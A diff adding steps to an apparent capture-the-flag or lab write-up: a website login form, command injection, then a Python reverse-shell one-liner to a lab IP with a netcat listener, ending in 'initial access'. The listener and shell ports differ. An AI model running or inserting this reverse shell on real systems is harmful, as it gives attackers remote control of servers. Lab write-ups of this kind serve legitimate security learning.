@@ -22,7 +22,7 @@ After a succesful login, the file was downloaded
 picture showing the download 
 ![gum_room](https://github.com/user-attachments/assets/39218184-a257-44b5-9826-ecdcd8ec7f1d)
 
-b.  80 
+b.  80: The website has a homepage with a login form
 
 The homepage
 ![image](https://github.com/user-attachments/assets/88eac3bd-6883-4760-a27f-67bc0fafd0b0)
@@ -46,7 +46,19 @@ Trying the comman d"Cat /etc", the website gave a response showing that it is vu
 
 
 
+the website was querried to confirm if there is a python binary on it 
 
+using the command 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.106.235",2294));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+and
+nc -nlvp 2249
+
+A reverse shell was gotten 
+Picture showing the reverse shell gotten from the server hosting the website
+![image](https://github.com/user-attachments/assets/eb87dc55-adaa-46cc-9b3d-5ca84aaad3db)
+
+
+And we were able to get initial access...
 
 
 
